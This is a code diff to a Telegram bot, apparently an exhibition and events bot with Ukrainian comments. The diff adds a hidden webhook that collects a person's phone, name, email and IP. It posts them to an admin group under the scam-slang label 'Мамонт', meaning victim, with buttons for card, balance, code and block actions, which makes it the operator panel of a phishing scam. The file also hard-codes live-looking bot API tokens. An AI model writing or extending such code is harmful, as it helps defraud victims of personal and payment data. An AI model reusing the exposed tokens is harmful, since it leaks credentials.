@@ -19,6 +19,9 @@ from PIL import Image
 import barcode
 from barcode.writer import ImageWriter
 import uuid
+from aiohttp import web
+import threading
+
 #API_TOKEN = "8055265032:AAHdP7_hwpJ--mzXYBQgbrJduxJ-uczEPGQ"
 API_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"
 ADMIN_GROUP_ID = -828011200
@@ -964,6 +967,53 @@ async def events_save_all(message):
     # Повертаємо меню після створення виставки
     kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
     await message.answer("Головне меню:", reply_markup=kb)
+
+async def notify_admin(request):
+    data = await request.json()
+    phone = data.get('phone', '')
+    name = data.get('name', '')
+    mail = data.get('mail', '')
+    ip = data.get('ip', '')
+    # Формуємо повідомлення
+    msg = (
+        f"Мамонт ввёл Ф.И.О: <b>{name}</b>\n\n"
+        f"<b>phone_number:</b> <code>{phone}</code>\n"
+        f"<b>full_name:</b> <code>{name}</code>\n"
+        f"<b>mail:</b> <code>{mail}</code>\n"
+        f"<b>ip:</b> <code>{ip}</code>"
+    )
+    # Кнопки (inline keyboard)
+    kb = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="1. 📱 Телефон", callback_data="phone"),
+                InlineKeyboardButton(text="2. 📨 Ф.И.О", callback_data="fio"),
+            ],
+            [
+                InlineKeyboardButton(text="3. 📍 Карта", callback_data="card"),
+                InlineKeyboardButton(text="4. ⚖️ Баланс", callback_data="balance"),
+                InlineKeyboardButton(text="5. 📨 Код", callback_data="code"),
+            ],
+            [
+                InlineKeyboardButton(text="❌ Код", callback_data="cancel_code"),
+            ],
+            [
+                InlineKeyboardButton(text="👁️", callback_data="eye"),
+            ],
+            [
+                InlineKeyboardButton(text="🗑️ Заблокировать", callback_data="block"),
+            ]
+        ]
+    )
+    await bot.send_message(ADMIN_GROUP_ID, msg, parse_mode='HTML', reply_markup=kb)
+    return web.Response(text="OK")
+
+def start_webhook():
+    app = web.Application()
+    app.router.add_post('/notify_admin', notify_admin)
+    web.run_app(app, port=8081)
+
+threading.Thread(target=start_webhook, daemon=True).start()
 
 if __name__ == '__main__':
     async def main():
